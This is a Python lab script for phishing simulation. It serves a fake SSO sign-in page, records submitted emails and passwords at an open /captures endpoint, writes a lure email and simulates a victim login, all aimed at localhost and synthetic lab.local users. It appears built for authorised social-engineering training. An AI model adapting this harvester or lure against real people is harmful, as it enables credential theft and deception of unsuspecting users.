#!/usr/bin/env python3
"""
Phishing / Social Engineering Lab Template
==========================================

Lab-only phishing landing + credential capture + MailHog-oriented notes.
Never point at real users or production mail.

Category: Red Team / SE Lab
Author: Security Research Lab
Version: 1.0.0
Date: 2026-09-06

Usage:
    python phishing_lab_template.py serve --bind 127.0.0.1 --port 8088
    python phishing_lab_template.py full --bind 127.0.0.1 --port 8088

Pair with MailHog/Mailpit for mail capture:
    docker run -p 1025:1025 -p 8025:8025 mailhog/mailhog

Legal: Authorized lab SE only. See 02 / 18_SOCIAL_ENGINEERING_LAB.md.
"""

from __future__ import annotations

from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs
from urllib.request import urlopen

import argparse
import html
import json
import logging
import sys
import threading
import time

logger = logging.getLogger("phish_lab")
logging.basicConfig(level=logging.INFO, format="[*] %(message)s")

CAPTURES: list[dict[str, Any]] = []

LANDING_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>Lab SSO Login</title></head>
<body style="font-family:system-ui;max-width:420px;margin:3rem auto">
  <h1>Lab Portal Sign-in</h1>
  <p style="color:#666">AUTHORIZED SECURITY LAB ONLY — synthetic users</p>
  <form method="POST" action="/login">
    <label>Email<br><input name="email" style="width:100%" value="victim@lab.local"></label><br><br>
    <label>Password<br><input name="password" type="password" style="width:100%" value="LabPass123!"></label><br><br>
    <button type="submit">Sign in</button>
  </form>
</body></html>
"""


class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        logger.debug(fmt, *args)

    def do_GET(self):
        if self.path.startswith("/health"):
            body = json.dumps({"ok": True, "captures": len(CAPTURES)}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if self.path.startswith("/captures"):
            body = json.dumps(CAPTURES, indent=2).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        page = LANDING_HTML.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.end_headers()
        self.wfile.write(page)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode(errors="replace")
        qs = parse_qs(raw)
        email = (qs.get("email") or [""])[0]
        password = (qs.get("password") or [""])[0]
        rec = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "email": email,
            "password": password,
            "ua": self.headers.get("User-Agent", ""),
            "marker": "LAB_PHISH_CAPTURE=1",
        }
        CAPTURES.append(rec)
        logger.info("Captured lab creds for %s", email)
        msg = f"<h1>Lab capture OK</h1><p>{html.escape(email)}</p><p>marker LAB_PHISH_CAPTURE=1</p>".encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(msg)))
        self.end_headers()
        self.wfile.write(msg)


def serve(bind: str, port: int) -> None:
    httpd = ThreadingHTTPServer((bind, port), PhishHandler)
    logger.info("Phish lab landing http://%s:%d", bind, port)
    httpd.serve_forever()


def email_template(landing_url: str) -> str:
    return f"""Subject: [LAB] Action required: sign in
To: victim@lab.local
From: it-security@lab.local

This is a LAB phishing simulation.
Open: {landing_url}

(Send via MailHog SMTP localhost:1025 — do not send to real inboxes.)
"""


def run_full(bind: str, port: int) -> dict:
    t = threading.Thread(target=serve, args=(bind, port), daemon=True)
    t.start()
    time.sleep(0.2)
    url = f"http://{bind}:{port}/"
    # Simulate victim POST
    import urllib.request

    data = b"email=victim%40lab.local&password=LabPass123%21"
    req = urllib.request.Request(url + "login", data=data, method="POST")
    with urlopen(req, timeout=5) as resp:
        body = resp.read().decode()
    captures = json.loads(urlopen(url + "captures", timeout=5).read().decode())
    return {
        "mode": "full",
        "landing": url,
        "email_template": email_template(url),
        "captures": captures,
        "verified": bool(captures) and "LAB_PHISH_CAPTURE" in body,
        "evidence": [c.get("marker") for c in captures],
    }


def main() -> None:
    p = argparse.ArgumentParser(description="Phishing SE lab template")
    sub = p.add_subparsers(dest="cmd", required=True)
    ps = sub.add_parser("serve")
    ps.add_argument("--bind", default="127.0.0.1")
    ps.add_argument("--port", type=int, default=8088)
    pf = sub.add_parser("full")
    pf.add_argument("--bind", default="127.0.0.1")
    pf.add_argument("--port", type=int, default=8088)
    pf.add_argument("--output")
    pe = sub.add_parser("email-template")
    pe.add_argument("--landing-url", default="http://127.0.0.1:8088/")
    args = p.parse_args()

    if args.cmd == "serve":
        serve(args.bind, args.port)
    elif args.cmd == "email-template":
        print(email_template(args.landing_url))
    elif args.cmd == "full":
        result = run_full(args.bind, args.port)
        print(json.dumps({k: v for k, v in result.items() if k != "email_template"}, indent=2))
        print("\n--- email template ---\n")
        print(result["email_template"])
        if args.output:
            Path(args.output).write_text(json.dumps(result, indent=2), encoding="utf-8")
        sys.exit(0 if result.get("verified") else 1)


if __name__ == "__main__":
    main()
